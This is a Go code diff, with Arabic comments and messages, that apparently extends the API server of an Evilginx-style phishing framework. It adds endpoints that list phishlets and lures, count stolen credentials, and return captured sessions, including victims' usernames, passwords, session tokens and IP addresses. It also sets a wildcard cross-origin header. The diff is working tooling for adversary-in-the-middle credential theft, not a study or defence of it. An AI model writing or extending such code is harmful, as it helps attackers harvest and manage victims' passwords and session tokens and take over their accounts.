@@ -646,7 +646,7 @@ type ApiPhishlet struct {
 	IsActive    bool   `json:"is_active"`
 	IsTemplate  bool   `json:"is_template"`
 	Author      string `json:"author"`
-	Description string `json:"description"`
+	RedirectUrl string `json:"redirect_url"`
 }
 
 // معالج للحصول على معلومات phishlet محدد
@@ -660,13 +660,17 @@ func (as *ApiServer) phishletHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	hostname, _ := as.cfg.GetSiteDomain(name)
+	isActive := as.cfg.IsSiteEnabled(name)
+	isTemplate := phishlet.isTemplate
+	
 	apiPhishlet := ApiPhishlet{
 		Name:        phishlet.Name,
-		Hostname:    phishlet.Hostname,
-		IsActive:    phishlet.IsActive,
-		IsTemplate:  phishlet.IsTemplate,
+		Hostname:    hostname,
+		IsActive:    isActive,
+		IsTemplate:  isTemplate,
 		Author:      phishlet.Author,
-		Description: phishlet.Description,
+		RedirectUrl: phishlet.RedirectUrl,
 	}
 
 	as.jsonResponse(w, ApiResponse{
@@ -683,14 +687,17 @@ func (as *ApiServer) phishletsHandler(w http.ResponseWriter, r *http.Request) {
 	apiPhishlets := make([]ApiPhishlet, 0)
 
 	for _, phishlet := range phishlets {
-		if !phishlet.IsHidden {
+		if !as.cfg.IsSiteHidden(phishlet.Name) {
+			hostname, _ := as.cfg.GetSiteDomain(phishlet.Name)
+			isActive := as.cfg.IsSiteEnabled(phishlet.Name)
+			
 			apiPhishlet := ApiPhishlet{
 				Name:        phishlet.Name,
-				Hostname:    phishlet.Hostname,
-				IsActive:    phishlet.IsActive,
-				IsTemplate:  phishlet.IsTemplate,
+				Hostname:    hostname,
+				IsActive:    isActive,
+				IsTemplate:  phishlet.isTemplate,
 				Author:      phishlet.Author,
-				Description: phishlet.Description,
+				RedirectUrl: phishlet.RedirectUrl,
 			}
 			apiPhishlets = append(apiPhishlets, apiPhishlet)
 		}
@@ -1021,4 +1028,152 @@ func (as *ApiServer) validateAuthToken(token string) bool {
 // GetBaseDomain يحصل على النطاق الأساسي من التكوين
 func (as *ApiServer) GetBaseDomain() string {
 	return as.cfg.GetBaseDomain()
+}
+
+// handleHeaders يضيف رؤوس HTTP الضرورية للاستجابة
+func (as *ApiServer) handleHeaders(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Access-Control-Allow-Origin", "*")
+		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
+		w.Header().Set("Access-Control-Allow-Headers", "Authorization, Content-Type")
+		if r.Method == "OPTIONS" {
+			w.WriteHeader(http.StatusOK)
+			return
+		}
+		next.ServeHTTP(w, r)
+	})
+}
+
+// healthHandler للتحقق من حالة الخادم
+func (as *ApiServer) healthHandler(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+	w.Write([]byte(`{"status":"ok"}`))
+}
+
+// dashboardHandler لإحصائيات لوحة التحكم
+func (as *ApiServer) dashboardHandler(w http.ResponseWriter, r *http.Request) {
+	// جمع البيانات للوحة التحكم
+	phishlets := as.cfg.GetPhishlets()
+	lures := as.cfg.lures
+	
+	// الحصول على الجلسات
+	sessions, err := as.db.ListSessions()
+	if err != nil {
+		as.jsonError(w, "فشل في استرجاع الجلسات", http.StatusInternalServerError)
+		return
+	}
+	
+	// عدد بيانات الاعتماد
+	credCount := 0
+	for _, session := range sessions {
+		if len(session.Username) > 0 || len(session.Password) > 0 {
+			credCount++
+		}
+	}
+	
+	// تجهيز البيانات
+	dashboardData := map[string]interface{}{
+		"phishlets_count": len(phishlets),
+		"lures_count": len(lures),
+		"sessions_count": len(sessions),
+		"credentials_count": credCount,
+		"recent_sessions": sessions[:min(5, len(sessions))],
+	}
+	
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Message: "تم استرجاع بيانات لوحة التحكم بنجاح",
+		Data: dashboardData,
+	})
+}
+
+// sessionsHandler لجلب قائمة الجلسات
+func (as *ApiServer) sessionsHandler(w http.ResponseWriter, r *http.Request) {
+	sessions, err := as.db.ListSessions()
+	if err != nil {
+		as.jsonError(w, "خطأ في استرجاع الجلسات", http.StatusInternalServerError)
+		return
+	}
+	
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Message: "تم استرجاع الجلسات بنجاح",
+		Data: sessions,
+	})
+}
+
+// sessionHandler لجلب تفاصيل جلسة محددة
+func (as *ApiServer) sessionHandler(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	id := vars["id"]
+	
+	// التحقق من طريقة الطلب
+	if r.Method == "GET" {
+		// الحصول على الجلسة
+		session, err := as.db.GetSession(id)
+		if err != nil {
+			as.jsonError(w, "الجلسة غير موجودة", http.StatusNotFound)
+			return
+		}
+		
+		as.jsonResponse(w, ApiResponse{
+			Success: true,
+			Message: "تم استرجاع تفاصيل الجلسة بنجاح",
+			Data: session,
+		})
+	} else if r.Method == "DELETE" {
+		// حذف الجلسة
+		err := as.db.DeleteSession(id)
+		if err != nil {
+			as.jsonError(w, "فشل في حذف الجلسة", http.StatusInternalServerError)
+			return
+		}
+		
+		as.jsonResponse(w, ApiResponse{
+			Success: true,
+			Message: "تم حذف الجلسة بنجاح",
+		})
+	} else {
+		as.jsonError(w, "طريقة الطلب غير مدعومة", http.StatusMethodNotAllowed)
+	}
+}
+
+// credsHandler لجلب بيانات الاعتماد
+func (as *ApiServer) credsHandler(w http.ResponseWriter, r *http.Request) {
+	sessions, err := as.db.ListSessions()
+	if err != nil {
+		as.jsonError(w, "خطأ في استرجاع بيانات الاعتماد", http.StatusInternalServerError)
+		return
+	}
+	
+	// استخراج بيانات الاعتماد من الجلسات
+	credentials := []map[string]interface{}{}
+	for _, session := range sessions {
+		if len(session.Username) > 0 || len(session.Password) > 0 {
+			cred := map[string]interface{}{
+				"id": session.Id,
+				"phishlet": session.Phishlet,
+				"username": session.Username,
+				"password": session.Password,
+				"tokens": session.Tokens,
+				"remote_addr": session.RemoteAddr,
+				"time": session.UpdateTime,
+			}
+			credentials = append(credentials, cred)
+		}
+	}
+	
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Message: "تم استرجاع بيانات الاعتماد بنجاح",
+		Data: credentials,
+	})
+}
+
+// min يقوم بإرجاع الأصغر من بين رقمين
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
 } 
